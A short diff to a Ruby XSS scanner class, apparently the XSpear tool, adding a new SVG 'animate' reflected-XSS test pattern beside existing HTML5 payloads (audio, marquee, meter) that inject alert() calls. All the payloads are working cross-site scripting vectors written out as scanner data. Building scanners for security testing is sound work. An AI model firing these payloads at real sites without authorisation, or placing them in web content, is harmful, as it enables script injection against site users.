@@ -537,6 +537,7 @@ class XspearScan
     r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '"\'><meter onmouseover=alert(45)>0</meter>', '<meter onmouseover=alert(45)>0</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>', '<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" />', 'h', "reflected "+"SVG Animate XSS".red, CallbackStringMatch)
 
 
     onfocus_tags.each do |t|
